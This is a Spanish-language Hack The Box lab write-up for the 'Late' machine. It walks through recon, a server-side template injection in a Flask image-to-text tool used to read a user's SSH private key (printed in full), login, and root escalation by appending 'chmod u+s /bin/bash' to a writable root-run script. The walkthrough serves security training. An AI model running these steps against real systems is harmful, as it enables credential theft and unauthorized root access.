---
layout: single
title: Late - Hack The Box
excerpt: "En este post estaremos resolviendo la maquina Late de la plataforma de Hackthebox donde mediante un subdominio que encontramos vamos a descubrir que se esta utilizando una utilidad para convertir texto apartir de una imagen esa utilidad pues tiene una vulnerabilidad que podemos convertirla a un SSTI para obtener la id_rsa de un usuario y conectarnos por SSH ademas para la escalada estaremos abusando de una tarea cron"
date: 2023-06-07
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-late/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - SSTI - Server Side Template Injection
  - Cron Job
  - Image to Text Flask Utility
---

⮕ Maquina Linux

```bash
❯ ping -c 1 10.10.11.156
PING 10.10.11.156 (10.10.11.156) 56(84) bytes of data.
64 bytes from 10.10.11.156: icmp_seq=1 ttl=63 time=271 ms

--- 10.10.11.156 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 271.417/271.417/271.417/0.000 ms
❯ whichSystem.py 10.10.11.156

10.10.11.156 (ttl -> 63): Linux
```

## PortScan

```bash
❯ nmap -sCV -p22,80 10.10.11.156 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 17:43 CST
Nmap scan report for 10.10.11.156
Host is up (0.58s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 025e290ea3af4e729da4fe0dcb5d8307 (RSA)
|   256 41e1fe03a5c797c4d51677f3410ce9fb (ECDSA)
|_  256 28394698171e461a1ea1ab3b9a577048 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Late - Best online image tools
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeracion

El puerto **80** esta abierto así que vamos a ver las tecnologías que están corriendo en el servicio web 

```ruby
❯ whatweb http://10.10.11.156
http://10.10.11.156 [200 OK] Bootstrap[3.0.0], Country[RESERVED][ZZ], Email[#,support@late.htb], Google-API[ajax/libs/jquery/1.10.2/jquery.min.js], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.156], JQuery[1.10.2], Meta-Author[Sergey Pozhilov (GetTemplate.com)], Script, Title[Late - Best online image tools], nginx[1.14.0]

```

Esta es la pagina web 

![](/assets/images/htb-writeup-late/web1.png)

Vamos a proceder aplicar **Fuzzing** para ver si encontramos alguna ruta interesante

```bash
❯ feroxbuster -t 200 -x php,txt,html -u http://10.10.11.156

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.156
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php, txt, html]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        7l       13w      194c http://10.10.11.156/assets
200      204l      517w     6364c http://10.10.11.156/contact.html
301        7l       13w      194c http://10.10.11.156/assets/images
301        7l       13w      194c http://10.10.11.156/assets/fonts
[####################] - 2m    479984/479984  0s      found:4       errors:119009 
[####################] - 2m    119996/119996  725/s   http://10.10.11.156
[####################] - 2m    119996/119996  745/s   http://10.10.11.156/assets
[####################] - 2m    119996/119996  732/s   http://10.10.11.156/assets/images
[####################] - 2m    119996/119996  794/s   http://10.10.11.156/assets/fonts

```

De momento no vemos nada interesante

Pero bueno si analizamos el código fuente vemos que hay un **subdominio** así que vamos agregarlo al `/etc/hosts`

![](/assets/images/htb-writeup-late/web2.png)

```bash
❯ echo "10.10.11.156 images.late.htb" | sudo tee -a /etc/hosts
10.10.11.156 images.late.htb
PING images.late.htb (10.10.11.156) 56(84) bytes of data.
64 bytes from images.late.htb (10.10.11.156): icmp_seq=1 ttl=63 time=112 ms

--- images.late.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 111.902/111.902/111.902/0.000 ms
```

## images.late.htb 

```ruby
❯ whatweb http://images.late.htb
http://images.late.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.156], JQuery[3.4.1], Script[text/javascript], Title[Image Reader], X-UA-Compatible[ie=edge], nginx[1.14.0]

```

Esta es la web que esta corriendo en el `subdominio` vemos que nos dicen que convierte una imagen a un documento de texto y esta usando `flask` lo mas probable es que contemple alguna vulnerabilidad **web**

![](/assets/images/htb-writeup-late/web3.png)

Vamos a subir una imagen cualquiera para ver si funciona

Si subimos la foto y le damos **click** en **SCAN IMAGE** nos descarga el `.txt` así que vamos a ver que es lo que descargo

```bash
❯ catn results.txt
<p>*
Convert image to texters

If you want to turn an image into a text document, you came to the right place.

Convert your image now!

Choose file Browse

</p>
```

## Server Side Template Injection

Bueno si analizamos el resultado vemos que esta usando etiquetas de `html` vamos a probar con un **SSTI** y vamos estar probando `payloads` de aquí mismo <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection>

Vamos a empezar con el mas común que es la multiplicación **7x7**  vamos a sacarle una captura de pantalla al `payload` para ver si no lo interpreta

![](/assets/images/htb-writeup-late/web4.png)

Y bueno una vez lo subimos y nos descargamos los resultados vemos que es vulnerable

```bash
❯ cat results.txt
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: results.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <p>49
   2   │ </p>
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Ahora lo que vamos a hacer es probar con este **Payload** que encontramos en **Payload all the things** para ver si podemos ejecutar el comando `id`

![](/assets/images/htb-writeup-late/web5.png)

Vemos que tenemos ejecución remota de comandos sabemos que ese usuario existe así que lo que vamos a hacer es decirle que nos muestre su `id_rsa` para conectarnos por `SSH`

```bash
❯ cat results.txt
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: results.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <p>uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)
   2   │ 
   3   │ </p>
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Vamos a probar con este 

![](/assets/images/htb-writeup-late/web6.png)

Bueno si también te llega a pasar este tipo de errores es por que se tiene que mejorar la foto xd así volveremos a tomar otra

![](/assets/images/htb-writeup-late/web7.png)

Bueno después de estar probando subiendo imágenes me funciono cuando le concatene un comando te dejo aquí la imagen por si gustas usarla

![](/assets/images/htb-writeup-late/web9.png)

Ahora tenemos la `id_rsa`

```bash
❯ catn results.txt | tail -n +2 | sed '$d'
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi
/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7
7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM
fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0
ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz
W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ
uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC
T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH
Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi
WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng
Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7
t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq
0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE
uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y
3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ
GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F
ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb
Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr
kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+
Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
-----END RSA PRIVATE KEY-----
```

## Shell svc_acc

```bash
❯ nano id_rsa
❯ chmod 600 id_rsa
```

```bash
❯ ssh -i id_rsa svc_acc@10.10.11.156
The authenticity of host '10.10.11.156 (10.10.11.156)' can't be established.
ECDSA key fingerprint is SHA256:bFNeiz1CrOE5/p6XvXGfPju6CF1h3+2nsk32t8V1Yfw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.156' (ECDSA) to the list of known hosts.
svc_acc@late:~$ export TERM=xterm
svc_acc@late:~$ 
```

## User.txt 

```bash
svc_acc@late:~$ cat user.txt 
9721d13e379a6ecd73fddb34121e6628
svc_acc@late:~$ 
```

## Escalada de Privilegios

Vemos que solo `root` tiene una `bash` aparte de nosotros así que ahora toca convertirnos en ese **usuario**

```bash
svc_acc@late:~$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash
svc_acc@late:~$ 
```

Este es el código fuente donde se muestra como funciona todo por detrás 

```bash
svc_acc@late:~/app$ cat main.py 
import datetime
import os, random
from flask.templating import render_template_string
from werkzeug.utils import secure_filename
import PIL.Image
import pytesseract
from PIL import Image
from flask import Flask, request, render_template, redirect, url_for, session, send_file

app = Flask(__name__)

upload_dir = "/home/svc_acc/app/uploads"
misc_dir = '/home/svc_acc/app/misc'
allowed_extensions =  ["jpg" ,'png']
app.secret_key = b'_5#y2L"F4Q8z\n\xec]/'


@app.route('/')
def home():
    return render_template("index.html", title="Image Reader")


@app.route('/scanner', methods=['GET', 'POST'])
def scan_file():
    scanned_text = ''
    results = ''
    if request.method == 'POST':
        start_time = datetime.datetime.now()
        f = request.files['file']
        
        if f.filename.split('.')[-1] in allowed_extensions:
            try:
                ID = str(random.randint(1,10000))
                file_name = upload_dir + "/" + secure_filename(f.filename )+ ID
                f.save(file_name)
                pytesseract.pytesseract.tesseract_cmd = r'/usr/bin/tesseract'
                scanned_text = pytesseract.image_to_string(PIL.Image.open(file_name))

                results = """<p>{}</p>""".format(scanned_text)

                r = render_template_string(results)
                path = misc_dir + "/" + ID + '_' + 'results.txt'
            
                with open(path, 'w') as f:
                    f.write(r)

                return send_file(path, as_attachment=True,attachment_filename='results.txt')

            except Exception as e:
                return ('Error occured while processing the image: ' + str(e))
        else:
            return 'Invalid Extension'

svc_acc@late:~/app$ 
```

No podemos aprovecharnos de ninguno de estos binarios que es **SUID**

```bash
svc_acc@late:/$ find \-perm -4000 2>/dev/null
./usr/sbin/pppd
./usr/sbin/sensible-mda
./usr/bin/chfn
./usr/bin/newuidmap
./usr/bin/passwd
./usr/bin/traceroute6.iputils
./usr/bin/newgrp
./usr/bin/sudo
./usr/bin/chsh
./usr/bin/arping
./usr/bin/procmail
./usr/bin/newgidmap
./usr/bin/gpasswd
./usr/bin/at
./usr/lib/openssh/ssh-keysign
./usr/lib/eject/dmcrypt-get-device
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
./bin/fusermount
./bin/mount
./bin/su
./bin/ping
./bin/umount
svc_acc@late:/$ 
```

Ahora vamos a ver por **capabilites** pero nada

```bash
svc_acc@late:/$ getcap -r / 2>/dev/null
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
svc_acc@late:/$ 
```

Bueno ahora vamos a ver **tareas cron** con **pspy** <https://github.com/DominicBreuker/pspy/releases>

```bash
❯ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.11.156 - - [07/Jun/2023 18:37:05] code 404, message File not found
10.10.11.156 - - [07/Jun/2023 18:37:05] "GET /pspy HTTP/1.1" 404 -
10.10.11.156 - - [07/Jun/2023 18:37:14] "GET /pspy64 HTTP/1.1" 200 -
```

```bash
svc_acc@late:/tmp$ wget http://10.10.14.5:8080/pspy64
--2023-06-08 00:37:13--  http://10.10.14.5:8080/pspy64
Connecting to 10.10.14.5:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                          100%[=======================================================>]   2.96M  27.0KB/s    in 1m 46s  

2023-06-08 00:38:59 (28.6 KB/s) - ‘pspy64’ saved [3104768/3104768]

svc_acc@late:/tmp$ chmod +x pspy64 
svc_acc@late:/tmp$ 

```

Vemos que después de que se ejecuta una **bash** se usa el comando `chattr` vamos a echarle un ojo 

![](/assets/images/htb-writeup-late/web10.png)

Bueno podemos alterar el script ya que tenemos permisos de escritura

```bash
svc_acc@late:/tmp$ ls -l /usr/local/sbin/ssh-alert.sh
-rwxr-xr-x 1 svc_acc svc_acc 433 Jun  8 00:46 /usr/local/sbin/ssh-alert.sh
svc_acc@late:/tmp$ 
```

```bash
svc_acc@late:/tmp$ cat /usr/local/sbin/ssh-alert.sh 
#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi


svc_acc@late:/tmp$ 
```

Vamos a tratar de escribir el **script**

Pero no nos deja

```bash
svc_acc@late:/usr/local/sbin$ echo "pwned" > ssh-alert.sh 
-bash: ssh-alert.sh: Operation not permitted
svc_acc@late:/usr/local/sbin$ 
```

Si listamos permisos mas avanzados tenemos permiso de hacer un `append` pero no podemos sobrescribir así que vamos a poner la bash **SUID**

```bash
svc_acc@late:/usr/local/sbin$ echo "chmod u+s /bin/bash" >> ssh-alert.sh
svc_acc@late:/usr/local/sbin$ 
```

Funciono 

```bash
svc_acc@late:/usr/local/sbin$ cat ssh-alert.sh 
#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi


chmod u+s /bin/bash
svc_acc@late:/usr/local/sbin$ 

```

Ahora nos vamos a salir para que se ejecute la tarea y nos conectaremos por **SSH** otra vez desde una nueva terminal

```bash
svc_acc@late:/usr/local/sbin$ exit
logout
Connection to 10.10.11.156 closed.
```

```bash
❯ ssh -i id_rsa svc_acc@10.10.11.156
-bash-4.4$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
-bash-4.4$ bash -p
bash-4.4# whoami
root
bash-4.4# 
```

## Root.txt 

```bash
bash-4.4# cd /root
bash-4.4# cat root.txt 
ffb414a36d4175479db507a6fe372fd1
bash-4.4# 
```

